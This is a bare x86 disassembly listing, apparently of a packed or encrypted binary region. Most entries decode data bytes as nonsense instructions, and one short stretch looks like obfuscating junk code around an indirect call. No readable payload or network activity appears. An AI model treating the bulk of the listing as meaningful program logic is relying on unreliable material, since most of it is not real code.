  4051df:	jnp    0x4051a4
  4051e1:	jmp    0x9205:0x555efcdb
  4051e8:	inc    eax
  4051e9:	cmp    eax,0xbda634ee
  4051ee:	add    edx,DWORD PTR [esi]
  4051f0:	mov    edi,0xb86af9e8
  4051f5:	lea    esp,[ebx-0x5f]
  4051f8:	cwde   
  4051f9:	dec    edx
  4051fa:	call   0x47e5:0x18d8a21
  405201:	push   es
  405202:	ds pop esi
  405204:	daa    
  405205:	xchg   edx,eax
  405206:	into   
  405207:	cwde   
  405208:	rol    DWORD PTR [eax+0x2a533c7d],0xe0
  40520f:	test   eax,0xbfab2729
  405214:	es jecxz 0x405201
  405217:	cmp    eax,0x8c4964ed
  40521c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40521d:	daa    
  40521e:	inc    ebx
  40521f:	inc    esi
  405220:	add    DWORD PTR [edi],ebp
  405222:	adc    al,0xd2
  405224:	sbb    BYTE PTR [esi],0x4a
  405227:	pop    ebp
  405228:	cld    
  405229:	sbb    DWORD PTR [eax+0x79aef3a8],ecx
  40522f:	xor    al,0xe1
  405231:	int    0x3d
  405233:	mov    eax,0x7f47126d
  405238:	imul   edi,DWORD PTR [esi+0x1807784f],0x74361ff7
  405242:	in     al,0xee
  405244:	inc    eax
  405246:	push   ebp
  405247:	aas    
  405248:	xor    ebp,DWORD PTR [ebx]
  40524a:	jge    0x40520a
  40524c:	sbb    esp,DWORD PTR [ecx+ebp*2-0x44315dad]
  405253:	cld    
  405254:	push   edx
  405255:	mov    bh,0xb7
  405257:	lahf   
  405258:	mov    ds:0xfe019606,eax
  40525d:	imul   ebp,DWORD PTR [ecx+0x48],0xfffffff7
  405261:	xchg   BYTE PTR [eax-0x1d387d2c],cl
  405267:	jmp    0x73742680
  40526c:	aas    
  40526d:	out    0x5,al
  40526f:	imul   edx,ebx,0xffffffa2
  405272:	test   BYTE PTR [esi+0x50],ch
  405275:	in     eax,dx
  405276:	aam    0x52
  405278:	xchg   esp,eax
  405279:	cli    
  40527a:	les    ebp,FWORD PTR [eax+edi*1]
  40527d:	dec    edi
  40527e:	sahf   
  40527f:	mov    ch,0x45
  405281:	and    esi,ebp
  405283:	inc    ecx
  405284:	stos   BYTE PTR es:[edi],al
  405285:	iret   
  405286:	adc    esp,ecx
  405288:	dec    ebp
  405289:	add    eax,0xe968280c
  40528e:	call   0xb997:0xa22dbf5
  405295:	out    0x5d,eax
  405297:	dec    ecx
  405298:	les    eax,FWORD PTR [ecx]
  40529a:	sbb    al,0xe
  40529c:	lods   al,BYTE PTR ds:[esi]
  40529d:	loopne 0x405295
  40529f:	jb     0x405271
  4052a1:	stos   DWORD PTR es:[edi],eax
  4052a2:	pop    es
  4052a3:	jl     0x405275
  4052a5:	and    cl,BYTE PTR [ebx]
  4052a7:	retf   0xcd5
  4052aa:	mov    ebp,0x9f300e12
  4052af:	sbb    eax,0x76cc371d
  4052b4:	inc    eax
  4052b5:	cmp    esp,ebx
  4052b7:	dec    esi
  4052b8:	mov    eax,0xaabacb59
  4052bd:	lds    eax,FWORD PTR [eax-0x6020dfcc]
  4052c3:	push   cs
  4052c4:	js     0x4052bf
  4052c6:	sahf   
  4052c7:	push   ebx
  4052c8:	in     al,0x1b
  4052ca:	imul   ecx,DWORD PTR [esi+0x3e],0xa
  4052ce:	xor    eax,ebx
  4052d0:	(bad)  
  4052d1:	mov    dh,0x39
  4052d3:	addr16 out 0x91,eax
  4052d6:	clc    
  4052d7:	xchg   DWORD PTR ds:0x10e7305d,edi
  4052dd:	and    DWORD PTR [eax-0x734479fa],ebp
  4052e3:	inc    ebp
  4052e4:	mov    bl,BYTE PTR [eax-0x4b3788a5]
  4052ea:	pop    esi
  4052eb:	lock mov bh,0x98
  4052ee:	test   al,0xc7
  4052f0:	xor    eax,0x88cb0694
  4052f5:	fistp  WORD PTR [esp+ebx*8+0x27a0864d]
  4052fc:	adc    BYTE PTR ds:0x48e3109c,bl
  405302:	cmp    cl,BYTE PTR [eax-0x2c]
  405305:	sbb    ah,0x2b
  405308:	dec    esp
  405309:	mov    dh,BYTE PTR [esi]
  40530b:	imul   ebp,DWORD PTR [edx-0x311f0858],0x29e62672
  405315:	fs retf 0x5b7f
  405319:	add    al,0x68
  40531b:	jle    0x40532b
  40531d:	and    eax,0x64229f1c
  405322:	jno    0x405325
  405324:	sub    al,0x7d
  405326:	test   DWORD PTR [esi+0x34],eax
  405329:	(bad)  
  40532a:	shl    BYTE PTR [esi+0x2baa523e],cl
  405330:	add    DWORD PTR [edi+0x7be1a923],0x51fa2075
  40533a:	scas   eax,DWORD PTR es:[edi]
  40533b:	jp     0x40533c
  40533d:	(bad)  
  40533e:	nop
  40533f:	and    eax,esi
  405341:	(bad)  
  405342:	enter  0x1f5c,0x9b
  405346:	inc    edi
  405347:	xor    eax,0x8aaa8863
  40534c:	inc    ebp
  40534d:	add    dh,dl
  40534f:	xchg   ebp,eax
  405350:	mov    edi,0xd3b12f0e
  405355:	mov    ds:0x520ce36,eax
  40535a:	cdq    
  40535b:	and    al,0x76
  40535d:	cmp    al,0x11
  40535f:	retf   0x1611
  405362:	call   0x4bce:0x73af4159
  405369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40536a:	and    dl,bl
  40536c:	add    DWORD PTR [ecx],ebx
  40536e:	rol    BYTE PTR [ecx],cl
  405370:	adc    edx,DWORD PTR [edi+0x504e8d1c]
  405376:	sbb    al,0x23
  405378:	int3   
  405379:	icebp  
  40537a:	add    BYTE PTR [esp+edx*1],cl
  40537d:	outs   dx,DWORD PTR ds:[si]
  40537f:	(bad)  
  405380:	fmul   QWORD PTR [edi+0x2d0122f1]
  405386:	bound  ebx,QWORD PTR [edi-0x9fa876e]
  40538c:	(bad)  
  40538e:	adc    BYTE PTR ds:0x9e1d51de,bl
  405394:	aaa    
  405395:	jb     0x4053ec
  405397:	and    al,0xd8
  405399:	out    dx,eax
  40539a:	stc    
  40539b:	mov    esp,0x484bd510
  4053a0:	scas   al,BYTE PTR es:[edi]
  4053a1:	(bad)  
  4053a2:	stos   DWORD PTR es:[edi],eax
  4053a3:	daa    
  4053a4:	inc    edx
  4053a5:	neg    bl
  4053a7:	std    
  4053a8:	add    al,bl
  4053aa:	push   es
  4053ab:	mov    dh,0xa6
  4053ad:	jmp    0x2b1802aa
  4053b2:	add    DWORD PTR [ebx],edi
  4053b4:	lods   al,BYTE PTR ds:[esi]
  4053b5:	pop    esi
  4053b6:	packsswb mm4,QWORD PTR ds:0xf66c2add
  4053bd:	jns    0x405422
  4053bf:	adc    BYTE PTR [edx+0x5c18bdd1],0xde
  4053c6:	rol    DWORD PTR [ebx+0x2583413d],1
  4053cc:	bound  ebp,QWORD PTR [esi]
  4053ce:	cld    
  4053cf:	in     al,dx
  4053d0:	test   al,0xdd
  4053d2:	dec    esp
  4053d3:	dec    ecx
  4053d4:	push   0xffffff84
  4053d6:	pop    ds
  4053d7:	pop    ds
  4053d8:	cmp    DWORD PTR [edx],esi
  4053da:	les    esp,FWORD PTR [ebx+0x6bc5c404]
  4053e0:	jne    0x4053b1
  4053e2:	mov    dl,0x57
  4053e4:	sbb    dh,BYTE PTR [ebx-0x5a]
  4053e7:	inc    ebp
  4053e8:	add    DWORD PTR [ebx],edx
  4053ea:	sbb    ch,BYTE PTR [ecx]
  4053ec:	cmp    cl,ah
  4053ee:	xchg   BYTE PTR [ebx],ah
  4053f0:	mov    eax,0xe1905324
  4053f5:	pop    edi
  4053f6:	mov    al,0x2d
  4053f8:	xchg   ebx,eax
  4053f9:	lock add esp,ebp
  4053fc:	jne    0x405438
  4053fe:	in     eax,0x63
  405400:	lea    ebx,[edx-0x1e]
  405403:	sbb    ebx,DWORD PTR [edi+0x7117d922]
  405409:	inc    esi
  40540a:	pop    ds
  40540b:	pop    es
  40540c:	mov    ebp,0x472019a6
  405411:	lods   eax,DWORD PTR ds:[esi]
  405412:	or     ecx,esp
  405414:	popf   
  405415:	leave  
  405416:	in     eax,0x82
  405418:	inc    edx
  405419:	mov    edi,0x3e56e639
  40541e:	rcl    DWORD PTR [ebx],1
  405420:	mov    cl,0xc6
  405422:	pop    edi
  405423:	xchg   esp,eax
  405424:	retf   0x1e64
  405427:	adc    cl,bh
  405429:	sti    
  40542a:	icebp  
  40542b:	mov    ebx,0x73e1fa25
  405430:	mov    dh,0xa0
  405432:	iret   
  405433:	ds (bad) 
  405435:	jl     0x40542e
  405437:	dec    eax
  405438:	fmul   QWORD PTR [edx+0x5d]
  40543b:	in     eax,dx
  40543c:	es retf 
  40543e:	cmp    ch,BYTE PTR [esi+0x3fef6bf3]
  405444:	sbb    DWORD PTR [ebx+0x3e],ecx
  405447:	push   esp
  405449:	les    eax,FWORD PTR [eax+0x384bb5f9]
  40544f:	addr16 and eax,0xf1cf1df
  405455:	repnz mov esi,0xd8060d5f
  40545b:	xchg   BYTE PTR [edi+0x72],bh
  40545e:	jbe    0x4054c7
  405460:	dec    ecx
  405461:	add    eax,0x7c10dad8
  405466:	sbb    BYTE PTR [ebx-0x19],al
  405469:	mov    ebx,0x551879a8
  40546e:	outs   dx,DWORD PTR ds:[esi]
  40546f:	(bad)  
  405470:	jl     0x40548f
  405472:	dec    edx
  405473:	and    bl,BYTE PTR [esi+0x2d]
  405476:	out    0xc5,eax
  405478:	xchg   ebx,eax
  405479:	ret    
  40547a:	sbb    esp,DWORD PTR [ecx+0x88da03e]
  405480:	xor    cl,bl
  405482:	mov    dl,0xab
  405484:	jnp    0x4054cf
  405486:	rcr    DWORD PTR [esi+0x3fc7e615],1
  40548c:	sbb    ch,BYTE PTR [edx]
  40548e:	add    al,0x4e
  405490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405491:	xchg   edi,eax
  405492:	jbe    0x405464
  405494:	fwait
  405495:	cmp    esp,esp
  405497:	ja     0x405487
  405499:	mov    ebx,0x2ec9dcb8
  40549e:	or     BYTE PTR [eax+0x7d],ah
  4054a1:	adc    eax,0x4a6d5ced
  4054a6:	cdq    
  4054a7:	stc    
  4054a8:	wrmsr  
  4054aa:	push   edi
  4054ab:	bound  ecx,QWORD PTR [edi+ecx*1-0x7fc77719]
  4054b2:	pop    ebp
  4054b3:	pusha  
  4054b4:	mov    ebp,0xe31dd8d1
  4054b9:	loopne 0x405441
  4054bb:	xchg   esi,eax
  4054bc:	fwait
  4054bd:	mov    cl,0x37
  4054bf:	xchg   ebp,eax
  4054c0:	inc    esi
  4054c1:	push   ebx
  4054c2:	std    
  4054c3:	sahf   
  4054c4:	dec    esi
  4054c5:	push   ds
  4054c6:	(bad)  
  4054c7:	je     0x4054b7
  4054c9:	jns    0x4054d8
  4054cb:	cmc    
  4054cc:	mov    esi,ebx
  4054ce:	pusha  
  4054cf:	mov    edi,0xd5ecea22
  4054d4:	mov    BYTE PTR [ebx+0x1a],ah
  4054d7:	out    0x8b,al
  4054d9:	sub    dh,BYTE PTR [esi+0x2c16f848]
  4054df:	stos   DWORD PTR es:[edi],eax
  4054e0:	out    dx,al
  4054e1:	inc    ebx
  4054e2:	outs   dx,BYTE PTR ds:[esi]
  4054e3:	ds clc 
  4054e5:	ja     0x405508
  4054e7:	push   edx
  4054e8:	sbb    DWORD PTR [esi-0x386c1e8d],esi
  4054ee:	pop    esi
  4054ef:	arpl   ax,cx
  4054f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f2:	xchg   BYTE PTR [edx+0x2a],cl
  4054f5:	mov    eax,cs
  4054f7:	push   eax
  4054f8:	mov    ebx,0x8c0166c3
  4054fd:	retf   0xc0d5
  405500:	dec    edx
  405501:	es sub al,0x5
  405504:	fmul   st(5),st
  405506:	cdq    
  405507:	jg     0x4054aa
  405509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40550a:	xchg   edx,eax
  40550b:	(bad)  
  40550c:	cmp    eax,0xe194bdf4
  405511:	cmp    esp,edi
  405513:	adc    BYTE PTR [edx+0x5],ah
  405516:	cwde   
  405517:	inc    esp
  405518:	in     eax,0x38
  40551a:	jecxz  0x405535
  40551c:	pop    edx
  40551d:	in     al,dx
  40551e:	mov    bh,BYTE PTR [edx]
  405520:	mov    esp,0x348f3eaf
  405525:	and    ebp,DWORD PTR [ebp+ebx*1+0x19]
  405529:	pop    es
  40552a:	out    dx,eax
  40552b:	pop    edi
  40552c:	xchg   ebx,eax
  40552d:	pusha  
  40552e:	mov    edx,0x61a02e54
  405533:	xchg   BYTE PTR [ebx],ch
  405535:	mov    esp,0xda2bdda5
  40553a:	mov    edx,0x43f74a27
  40553f:	int3   
  405540:	jnp    0x4054fb
  405542:	add    eax,0x8e9e8f08
  405547:	(bad)  
  405548:	mov    ch,0xf2
  40554a:	loop   0x4054d3
  40554c:	stos   BYTE PTR es:[edi],al
  40554d:	call   0xdd005355
  405552:	sbb    al,0x4c
  405554:	fdivr  DWORD PTR [ecx-0x5bcdd9dd]
  40555a:	les    ebp,FWORD PTR [ebx+0x6c]
  40555d:	scas   al,BYTE PTR es:[edi]
  40555e:	xchg   esp,eax
  40555f:	jge    0x405572
  405561:	pop    ds
  405562:	pop    es
  405563:	mov    ebx,0x18f3c
  405568:	cmp    al,0xd9
  40556a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40556b:	pop    esi
  40556c:	mov    esi,0x89ff94cb
  405571:	cwde   
  405572:	pop    ecx
  405573:	pop    esp
  405574:	mov    ebx,0x7371939a
  405579:	out    dx,eax
  40557a:	and    BYTE PTR [eax+eiz*4-0xb],bh
  40557e:	lods   eax,DWORD PTR ds:[esi]
  40557f:	cmp    eax,0x762cbfb3
  405584:	fsubr  DWORD PTR [edi+0x10]
  405587:	jmp    0x4055d6
  405589:	pop    ecx
  40558a:	clc    
  40558b:	pop    edi
  40558c:	ror    ebp,cl
  40558e:	ficom  DWORD PTR ds:0x68d42ba2
  405594:	mov    esi,0xbfdead73
  405599:	mov    dh,0x6c
  40559b:	xchg   BYTE PTR [ebp+ecx*1-0x3452dc72],cl
  4055a2:	xchg   edx,eax
  4055a3:	and    al,0x88
  4055a5:	hlt    
  4055a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055a8:	fidivr DWORD PTR [ebp+ecx*1+0x621fe005]
  4055af:	fidivr DWORD PTR [ebp+eiz*1+0x3]
  4055b3:	imul   ebp,DWORD PTR [edx+esi*1],0x54bb6692
  4055ba:	mov    ah,0x92
  4055bc:	scas   eax,DWORD PTR es:[edi]
  4055bd:	lods   al,BYTE PTR ds:[esi]
  4055be:	fld    QWORD PTR [ebp-0x1]
  4055c1:	push   ss
  4055c2:	and    esp,esi
  4055c4:	push   edx
  4055c5:	rcl    DWORD PTR [ebx-0xc],1
  4055c8:	fsubr  QWORD PTR [edx-0x13]
  4055cb:	pop    eax
  4055cc:	inc    DWORD PTR [edx]
  4055ce:	imul   esp,DWORD PTR fs:[esi-0x56],0x20500791
  4055d6:	mov    eax,ebx
  4055d8:	and    edi,DWORD PTR [eax+0x2d69dfe1]
  4055de:	sbb    eax,0x37cc5453
  4055e3:	and    cl,BYTE PTR [ecx-0xcdf08d2]
  4055e9:	cmp    al,bl
  4055eb:	xchg   ebx,eax
  4055ec:	scas   al,BYTE PTR es:[edi]
  4055ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055ee:	add    esp,DWORD PTR [ebx-0x4fe10ff3]
  4055f4:	test   DWORD PTR [esi+ecx*1+0x4a],0xdef52f78
  4055fc:	adc    esi,DWORD PTR [edi-0x35]
  4055ff:	jecxz  0x40561c
  405601:	sub    ah,dh
  405603:	and    ebp,DWORD PTR [ecx-0x4416a2ff]
  405609:	sbb    bh,bl
  40560b:	push   ebx
  40560c:	leave  
  40560d:	fxch   st(4)
  40560f:	cwde   
  405610:	sub    eax,0xa3cb98d9
  405615:	popa   
  405616:	arpl   WORD PTR [edi],si
  405618:	test   eax,0xae7f392c
  40561d:	add    al,0xac
  40561f:	int3   
  405620:	push   esp
  405621:	or     BYTE PTR [esi+0x4b],dl
  405624:	popa   
  405625:	pushf  
  405626:	sbb    eax,0xa313ccc6
  40562b:	adc    eax,0x7d70d071
  405630:	leave  
  405631:	clc    
  405632:	mov    bh,0x68
  405634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405635:	popa   
  405636:	stos   DWORD PTR es:[edi],eax
  405637:	sub    eax,0xe070f29e
  40563c:	in     al,dx
  40563d:	xor    dl,BYTE PTR [ebx-0x80]
  405640:	aam    0x61
  405642:	mov    DWORD PTR [esi],eax
  405644:	add    dh,dh
  405646:	dec    esi
  405647:	leave  
  405648:	mov    dh,0x5e
  40564a:	in     eax,dx
  40564b:	sub    al,0x48
  40564d:	adc    eax,0x24877285
  405652:	dec    ebp
  405653:	inc    esp
  405654:	pop    edi
  405655:	and    dh,dl
  405657:	int3   
  405658:	sbb    al,0x7
  40565a:	mov    ds,WORD PTR [eax]
  40565c:	add    DWORD PTR [esi+0x71],esi
  40565f:	inc    ebp
  405660:	gs ret 0x66cc
  405664:	cld    
  405665:	xor    DWORD PTR [ebx-0xc],eax
  405668:	push   0xffffffd5
  40566a:	jg     0x4056be
  40566c:	dec    ebx
  40566d:	ror    DWORD PTR [eax+ecx*2],0x45
  405671:	sub    eax,0xfa5a798b
  405676:	cmc    
  405677:	aam    0xf5
  405679:	out    dx,eax
  40567a:	or     cl,BYTE PTR [edi+0x53]
  40567d:	stos   BYTE PTR es:[edi],al
  40567e:	or     ebx,DWORD PTR [ecx+0x5b0f9e3d]
  405684:	aad    0xb4
  405686:	or     ah,al
  405688:	xor    eax,DWORD PTR [edi]
  40568a:	push   0x73209d3c
  40568f:	sbb    ah,BYTE PTR [ebp-0x421f85fd]
  405695:	mov    bh,0xb8
  405697:	jne    0x405664
  405699:	imul   edi,DWORD PTR [ecx-0x74c97ebe],0x96fec47b
  4056a3:	(bad)  [eax]
  4056a5:	out    0x37,eax
  4056a7:	pop    ebx
  4056a8:	aad    0x67
  4056aa:	imul   esp,DWORD PTR ds:0x296fe72e,0xc5786959
  4056b4:	inc    ebx
  4056b5:	loope  0x405715
  4056b7:	jne    0x4056ea
  4056b9:	jnp    0x4056d9
  4056bb:	neg    DWORD PTR [ecx]
  4056bd:	dec    ecx
  4056be:	imul   DWORD PTR [ebp-0xb86804b]
  4056c4:	cmp    al,0xdf
  4056c6:	jge    0x405739
  4056c8:	jmp    0xf3a6:0xe0cd189e
  4056cf:	cwde   
  4056d0:	mov    dl,0xeb
  4056d2:	iret   
  4056d3:	mov    DWORD PTR [ebp-0x497958c2],edx
  4056d9:	das    
  4056da:	add    al,0x4a
  4056dc:	and    al,0xf0
  4056de:	(bad)  
  4056df:	ja     0x405700
  4056e1:	scas   al,BYTE PTR es:[edi]
  4056e2:	lods   al,BYTE PTR ds:[esi]
  4056e3:	pusha  
  4056e4:	into   
  4056e5:	lds    edi,FWORD PTR [ecx]
  4056e7:	cmp    DWORD PTR [ecx-0x66],0x651cffe7
  4056ee:	je     0x40575d
  4056f0:	ss in  eax,dx
  4056f2:	mov    ch,0x5
  4056f4:	and    eax,DWORD PTR [edi+0x49]
  4056f7:	jmp    0x7221:0x37828043
  4056fe:	(bad)
  405701:	fistp  WORD PTR [edx]
  405703:	scas   eax,DWORD PTR es:[edi]
  405704:	pop    eax
  405705:	iret   
  405706:	out    0x38,eax
  405708:	imul   ebx,ebp,0xc1f0bef5
  40570e:	loope  0x40572e
  405710:	lea    ecx,[edx+eax*1]
  405713:	mov    eax,DWORD PTR [ebx]
  405715:	movzx  edx,WORD PTR ds:0x4228ca
  40571c:	or     edx,DWORD PTR ds:0x4229ae
  405722:	mov    DWORD PTR ds:0x4228ca,edx
  405728:	mov    edx,DWORD PTR [ebx+0x4]
  40572b:	sub    DWORD PTR ds:0x4228de,0x42296a
  405735:	shrd   eax,edx,0x2
  405739:	shr    edx,0x2
  40573c:	cmp    DWORD PTR ds:0x422936,0x0
  405743:	mov    DWORD PTR ds:0x42296a,edx
  405749:	mov    DWORD PTR ds:0x4229ca,0x5a5b
  405753:	mov    DWORD PTR ds:0x422952,0x59ac
  40575d:	jmp    0x4057b9
  405762:	not    edx
  405764:	mov    edx,DWORD PTR ds:0x4228aa
  40576a:	jbe    0x4057a1
  405770:	push   0x1
  405772:	push   0x68d9
  405777:	call   DWORD PTR ds:0x42a29c
  40577d:	mov    edx,DWORD PTR ds:0x4229ce
  405783:	add    DWORD PTR ds:0x422922,edx
  405789:	xor    edx,edx
  40578b:	or     edx,DWORD PTR ds:0x422926
  405791:	add    DWORD PTR ds:0x42297a,edx
  405797:	or     DWORD PTR ds:0x4228d6,0x1005
  4057a1:	add    DWORD PTR ds:0x4228ae,ecx
  4057a7:	mov    DWORD PTR ds:0x422912,0x7731
  4057b1:	add    edx,0x5dfe
  4057b7:	not    edx
  4057b9:	mov    DWORD PTR [ebp-0x1c],eax
  4057bc:	mov    edx,DWORD PTR ds:0x422982
  4057c2:	or     DWORD PTR ds:0x4228c2,edx
  4057c8:	mov    eax,DWORD PTR [ebx]
  4057ca:	jmp    0x405d54
  4057cf:	loope  0x405800
  4057d1:	adc    eax,0x58a019aa
  4057d6:	adc    al,0x1b
  4057d8:	push   ds
  4057d9:	fsubr  DWORD PTR [eax+0x6e5cde3c]
  4057df:	adc    DWORD PTR [ecx+0x43d1616],esp
  4057e5:	push   ss
  4057e6:	push   ss
  4057e7:	fwait
  4057e8:	xor    al,0x17
  4057ea:	ss xchg ebp,eax
  4057ec:	lods   eax,DWORD PTR ds:[esi]
  4057ed:	mov    ebp,0xfa57e050
  4057f2:	aad    0xc3
  4057f4:	inc    ebp
  4057f5:	xchg   ebp,eax
  4057f6:	mov    ds:0x8c578660,eax
  4057fb:	push   es
  4057fc:	rcl    DWORD PTR [ebx-0x1a],1
  4057ff:	loope  0x40583f
  405801:	inc    ebx
  405802:	mov    edi,0xc5eca929
  405807:	outs   dx,DWORD PTR ds:[esi]
  405808:	pop    ebx
  405809:	hlt    
  40580a:	lock cmp dh,BYTE PTR [esi-0x6c5c5d11]
  405811:	arpl   di,di
  405813:	dec    ebx
  405814:	pop    ss
  405815:	lds    eax,FWORD PTR [edx-0x36f3d234]
  40581b:	dec    esi
  40581c:	bound  eax,QWORD PTR ds:0x6c671d8b
  405822:	push   ebp
  405823:	jl     0x405845
  405825:	cdq    
  405826:	jmp    0xa29d3c84
  40582b:	cmp    eax,0xea2fa548
  405830:	test   eax,0x7fb1bee
  405835:	jb     0x405805
  405837:	es mov bh,0x9c
  40583a:	and    BYTE PTR [esi-0x3d431c64],ch
  405840:	aaa    
  405841:	inc    esp
  405842:	ret    
  405843:	adc    DWORD PTR [ecx-0x21],edi
  405846:	cmc    
  405847:	add    cl,BYTE PTR gs:[ebp-0x53]
  40584b:	xor    edx,DWORD PTR [edx]
  40584d:	inc    DWORD PTR [ebx-0x29cce3c2]
  405853:	test   BYTE PTR [esi],ch
  405855:	inc    ecx
  405856:	cmp    al,0xf
  405858:	mov    bl,0x75
  40585a:	mov    bh,BYTE PTR [edx-0x12]
  40585d:	cmp    bl,BYTE PTR [edi+0x7eccf393]
  405863:	aaa    
  405864:	out    0x9,al
  405866:	mov    bl,BYTE PTR [ebx-0x3e]
  405869:	cmp    DWORD PTR [esi-0x655d874d],esp
  40586f:	adc    ch,cl
  405871:	jmp    0x8b35:0x6465e81
  405878:	jmp    0x9de2:0x190885b6
  40587f:	dec    esi
  405880:	or     eax,0x8733b06f
  405885:	ins    BYTE PTR es:[edi],dx
  405886:	(bad)  
  405887:	das    
  405888:	call   0x714:0xcb789472
  40588f:	sbb    al,0x95
  405891:	push   ebp
  405892:	add    eax,0xf405c866
  405897:	fistp  DWORD PTR [edx-0x3c]
  40589a:	xchg   esp,eax
  40589b:	pop    eax
  40589c:	and    edi,DWORD PTR [ebx]
  40589e:	sti    
  40589f:	push   cs
  4058a0:	inc    esp
  4058a1:	addr16 add eax,esi
  4058a4:	pusha  
  4058a5:	lea    eax,[esi-0x28db5d88]
  4058ab:	sbb    eax,esi
  4058ad:	xlat   BYTE PTR ds:[ebx]
  4058ae:	scas   al,BYTE PTR es:[edi]
  4058af:	retf   
  4058b0:	xchg   esi,eax
  4058b1:	inc    ecx
  4058b2:	xor    cl,BYTE PTR [ebp+0x76]
  4058b5:	add    esp,DWORD PTR ds:0x3a5c482a
  4058bb:	lahf   
  4058bc:	cmp    esp,ebp
  4058be:	mov    ds:0xbc67865,al
  4058c3:	ja     0x4058be
  4058c5:	inc    ecx
  4058c6:	ja     0x4058fd
  4058c8:	mov    dl,BYTE PTR [ebp-0x16]
  4058cb:	imul   eax,eax,0xffffffd4
  4058ce:	int3   
  4058cf:	push   ecx
  4058d0:	inc    ecx
  4058d1:	push   ss
  4058d2:	push   edi
  4058d3:	into   
  4058d4:	sub    al,0x33
  4058d6:	add    eax,edi
  4058d8:	in     al,0x48
  4058da:	stc    
  4058db:	xchg   BYTE PTR [esi-0x1],bl
  4058de:	jge    0x405944
  4058e0:	pop    esp
  4058e1:	mov    ah,0xa8
  4058e3:	or     DWORD PTR [ecx-0x79],esp
  4058e6:	mov    edx,0x3e041248
  4058eb:	cmc    
  4058ec:	ds in  al,0x4e
  4058ef:	lods   al,BYTE PTR ds:[esi]
  4058f0:	sahf   
  4058f1:	push   cs
  4058f2:	jge    0x405894
  4058f4:	clc    
  4058f5:	push   es
  4058f6:	repnz sbb DWORD PTR [eax+0x60],eax
  4058fa:	jle    0x40596d
  4058fc:	sub    esp,edx
  4058fe:	test   DWORD PTR [ebx],esi
  405900:	(bad)  
  405901:	fst    QWORD PTR [edx-0x55]
  405904:	inc    ebp
  405905:	jb     0x4058be
  405907:	jl     0x405948
  405909:	dec    ebp
  40590a:	mov    ds:0xa7217b57,eax
  40590f:	loopne 0x4058cd
  405911:	cs aam 0x5d
  405914:	rol    DWORD PTR [eax],cl
  405916:	dec    ecx
  405917:	ror    BYTE PTR ds:0xaeb84dcc,0x3c
  40591e:	outs   dx,BYTE PTR ds:[esi]
  40591f:	(bad)
  405923:	jns    0x40594f
  405925:	jne    0x4058b8
  405927:	push   ebp
  405928:	add    eax,0x19b2c5a0
  40592d:	push   0x6c
  40592f:	mov    edi,DWORD PTR [edx+0x3a]
  405932:	pop    edi
  405933:	into   
  405934:	adc    ebp,edi
  405936:	jmp    0x8a03:0xc240cffe
  40593d:	jmp    0x40599b
  40593f:	ins    BYTE PTR es:[edi],dx
  405940:	mov    eax,ds:0xbb9afc69
  405945:	inc    ebp
  405946:	(bad)  
  405947:	or     ebx,DWORD PTR [edi]
  405949:	in     al,0x6
  40594b:	adc    ah,BYTE PTR [ecx-0x3ba2593b]
  405951:	mov    bl,0xba
  405953:	adc    BYTE PTR [eax+0x76c4bf3a],bl
  405959:	not    BYTE PTR [edx-0x3d3ef274]
  40595f:	push   es
  405960:	add    edx,0xe5eff2cf
  405966:	mov    edx,DWORD PTR [edi+0x14261edc]
  40596c:	mov    ah,0xf3
  40596e:	inc    edx
  40596f:	mov    esp,0x32f90294
  405974:	mov    cl,0x5c
  405976:	pop    esi
  405977:	cdq    
  405978:	inc    eax
  405979:	pop    ebx
  40597a:	hlt    
  40597b:	push   edx
  40597c:	pop    edx
  40597d:	in     eax,0x7d
  40597f:	scas   al,BYTE PTR es:[edi]
  405980:	and    al,0x8d
  405982:	mov    ch,0xc4
  405984:	push   esi
  405985:	pop    esi
  405986:	test   DWORD PTR [eax],ebx
  405988:	out    0xf1,al
  40598a:	bnd jge 0x40594e
  40598d:	mov    bh,0x15
  40598f:	aam    0x53
  405991:	jl     0x405963
  405993:	adc    al,0xf1
  405995:	push   ebp
  405996:	pop    ss
  405997:	or     DWORD PTR [edi+0x38],ebp
  40599a:	push   edx
  40599b:	sbb    al,0xfe
  40599d:	pop    eax
  40599e:	std    
  40599f:	xchg   bp,ax
  4059a1:	aad    0x7c
  4059a3:	mov    WORD PTR [eax+0xa5f736],?
  4059a9:	adc    BYTE PTR [esi-0x5d],bl
  4059ac:	pop    eax
  4059ad:	ret    
  4059ae:	(bad)  
  4059b0:	std    
  4059b1:	mov    ?,WORD PTR [ecx]
  4059b3:	stc    
  4059b4:	arpl   WORD PTR [ebx-0x6b257933],dx
  4059ba:	xchg   BYTE PTR [edi-0x51],bh
  4059bd:	add    ebx,DWORD PTR [ecx-0x16d0864f]
  4059c3:	dec    edx
  4059c4:	into   
  4059c5:	scas   al,BYTE PTR es:[edi]
  4059c6:	imul   ebx,edx,0x50195108
  4059cc:	jg     0x405a23
  4059ce:	sbb    edx,DWORD PTR [eax+0x1d]
  4059d1:	int3   
  4059d2:	pop    esp
  4059d3:	jo     0x40597a
  4059d5:	cwde   
  4059d6:	lods   al,BYTE PTR ds:[esi]
  4059d7:	cmp    DWORD PTR [esi-0x47541954],ebx
  4059dd:	int3   
  4059de:	or     al,ah
  4059e0:	or     eax,0xffe7f3a4
  4059e5:	inc    ebx
  4059e6:	call   0xc052:0xf01861e1
  4059ed:	outs   dx,DWORD PTR ds:[esi]
  4059ee:	cmp    cl,ah
  4059f0:	sbb    edi,DWORD PTR [esi+0x2f442f75]
  4059f6:	or     dh,0xf4
  4059f9:	dec    edi
  4059fa:	dec    ebx
  4059fb:	sbb    BYTE PTR [ebp-0x347567c3],bl
  405a01:	bound  eax,QWORD PTR [ebp-0x5ea1c761]
  405a07:	out    dx,al
  405a08:	pop    edx
  405a09:	into   
  405a0a:	sub    DWORD PTR [ebp+0x6b],ecx
  405a0d:	and    dh,BYTE PTR [edx+0x39]
  405a10:	leave  
  405a11:	mov    BYTE PTR [edi-0x631b569e],dl
  405a17:	cdq    
  405a18:	dec    ebx
